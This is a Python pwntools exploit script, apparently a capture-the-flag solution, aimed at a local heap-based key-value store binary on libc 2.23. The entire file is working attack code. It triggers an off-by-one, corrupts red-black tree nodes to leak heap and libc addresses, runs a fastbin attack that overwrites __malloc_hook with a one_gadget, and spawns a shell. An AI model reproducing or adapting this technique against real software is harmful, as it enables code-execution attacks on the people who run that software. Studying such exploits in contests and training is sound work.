#!/usr/bin/env python3
from pwn import *

def GET(key):
    p.sendlineafter(b'Enter command:', b'GET')
    p.sendlineafter(b'Enter row key:', key)

def PUT(key, data):
    p.sendlineafter(b'Enter command:', b'PUT')
    p.sendlineafter(b'Enter row key:', key)
    p.sendlineafter(b'Enter data size:', str(len(data)))
    p.sendafter(b'Enter data:', data)

def DUMP():
    p.sendlineafter(b'Enter command:', b'DUMP')

def DEL(key):
    p.sendlineafter(b'Enter command:', b'DEL')
    p.sendlineafter(b'Enter row key:', key)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
p = process('./datastore')

# create off-by-one environment
PUT(b'a' * 0x10, b'A' * 0x170)
PUT(b'b' * 0x10, b'B' * 0x270)
DEL(b'x' * 0x10)

DEL(b'b' * 0x10)

DEL(b'a' * 0x10)

payload = b'C' * 0x1f0 + p64(0) + p64(0x81) + b'-' * 0x70
PUT(b'c' * 0x10, payload)

PUT(b'd' * 0x10, b'D' * 0x360)

prev_size = 0x1c0
payload2 = b'X' * 0x10 + p64(prev_size)
DEL(payload2)

# trigger off-by-one
DEL(b'c' * 0x10)

# overwrite red-black tree struct
# leak heap
PUT(b'9' * 0x10, b'9' * 0x150)

DUMP()
p.recvuntil(b'INFO')
p.recvuntil(b'INFO')
p.recvuntil(b'INFO: Row [')
heap = u64(p.recvuntil(b']', drop=True).ljust(8, b'\0')) - 0x8f0
log.info('heap: {:#x}'.format(heap))

# overwrite red-black tree struct again
# leak libc
DEL(b'9' * 0x10)

payload3 = b'9' * 0x160 
payload3 += p64(heap + 0xd0) + p64(0x80) + p64(heap + 0x290) + p64(0) + p64(0) + p64(0) 
PUT(b'9' * 0x10, payload3)

GET(b'd' * 0x10)

p.recvuntil(b'[128 bytes]:\n')
p.recv(0x20)
libc.address = u64(p.recv(0x8)) - 0x3c4b78
log.info('libc: {:#x}'.format(libc.address))

# fastbin attack
DEL(b'9' * 0x10)

# overwrite red-black tree struct and free it
# produce 0x20 chunk
payload3 = b'9' * 0x150
payload3 += p64(0) + p64(0x41)
payload3 += p64(heap + 0x2b0) + p64(0x80) + p64(heap + 0x320) + p64(0) + p64(0) + p64(0) 
payload3 += p64(0) + p64(0x71)
payload3 += b'd' * 0x10
payload3 += p64(0) + p64(0)
payload3 += p64(0) + p64(0)
payload3 += p64(0) + p64(0)
payload3 += p64(0) + p64(0)
payload3 += p64(0) + p64(0)
payload3 += p64(0) + p64(0x21)
payload3 += p64(0) + p64(0)
PUT(b'9' * 0x10, payload3)

DEL(b'd' * 0x10)

# overwrite fast bin fd
DEL(b'9' * 0x10)

target = libc.symbols['__malloc_hook'] - 0x23
payload4 = b'9' * 0x150
payload4 += p64(0) + p64(0x41)
payload4 += p64(0) + p64(0)
payload4 += p64(0) + p64(0)
payload4 += p64(0) + p64(0)
payload4 += p64(0) + p64(0x71)
payload4 += p64(target) + p64(0)
payload4 += p64(0) + p64(0)
payload4 += p64(0) + p64(0)
payload4 += p64(0) + p64(0)
payload4 += p64(0) + p64(0)
payload4 += p64(0) + p64(0)
payload4 += p64(0) + p64(0x21)
payload4 += p64(0) + p64(0)
PUT(b'9' * 0x10, payload4)

PUT(b'-' * 0x10, b'-' * 0x60)

one_gadget = libc.address + 0x4526a
payload5 = b'\0' * 0x13
payload5 += p64(one_gadget)
payload5 = payload5.ljust(0x60, b'\0')
PUT(b'yee', payload5)

DEL(b'whoami')

p.interactive()
